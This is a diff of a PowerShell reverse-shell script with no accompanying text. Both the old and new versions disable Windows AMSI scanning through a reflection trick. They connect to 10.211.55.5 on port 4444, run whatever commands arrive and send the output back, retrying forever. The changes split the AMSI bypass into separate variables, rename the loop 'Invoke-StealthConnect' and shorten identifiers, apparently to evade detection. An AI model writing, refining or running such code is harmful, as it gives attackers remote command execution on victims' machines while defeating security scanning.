@@ -1,53 +1,39 @@
 
-$TargetIP   = "10.211.55.5"
-$TargetPort = 4444  
-$RetryDelay = 5    
+$IP = "10.211.55.5"
+$PT = 4444
 
 
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+$w = 'System.Management.Automation.AmsiUtils'
+$f = 'amsiInitFailed'
+[Ref].Assembly.GetType($w).GetField($f, 'NonPublic,Static').SetValue($null, $true)
 
 
-While ($true) {
-    Try {
-
-        $client = New-Object System.Net.Sockets.TCPClient($TargetIP, $TargetPort)
-        $stream = $client.GetStream()
-        
-        
-        $reader = New-Object System.IO.StreamReader($stream)
-        $writer = New-Object System.IO.StreamWriter($stream)
-        
-      
-        $buf = New-Object Byte[] 4096
-
-       
-        While($client.Connected) {
-            
-If ($stream.DataAvailable) {
-                $count = $stream.Read($buf, 0, $buf.Length)
-                $cmd = [System.Text.Encoding]::ASCII.GetString($buf, 0, $count).Trim()
-If ($cmd.Length -gt 0) {
-                   
+Function Invoke-StealthConnect {
+While($true) {
 Try {
-                        $result = Invoke-Expression $cmd 2>&1 | Out-String
-                    } catch {
-                        $result = $_.Exception.Message
-                    }
+           
+            $c = [System.Activator]::CreateInstance([System.Net.Sockets.TcpClient], $IP, $PT)
+            $s = $c.GetStream()
+            $b = New-Object byte[] 8192
+While($c.Connected) {
+            
+                $r = $s.Read($b, 0, $b.Length)
+If($r -gt 0) {
+                    $d = [System.Text.Encoding]::ASCII.GetString($b, 0, $r)
                     
-                 
-                    $writer.Write($result + "PS> ")
-                    $writer.Flush()
+               
+                    $out = &([scriptblock]::Create($d)) 2>&1 | Out-String
+                    $res = [System.Text.Encoding]::ASCII.GetBytes($out + "PS> ")
+                    $s.Write($res, 0, $res.Length)
+                    $s.Flush()
                 }
             }
-            Start-Sleep -Milliseconds 100
+        } catch {
+           
+            Start-Sleep -Seconds 10
         }
-    } 
-    Catch {
-       
-        Start-Sleep -Seconds $RetryDelay
-    }
-    Finally {
-       
-If ($client) { $client.Close() }
     }
 }
+
+# --- EXECUTION ---
+Invoke-StealthConnect
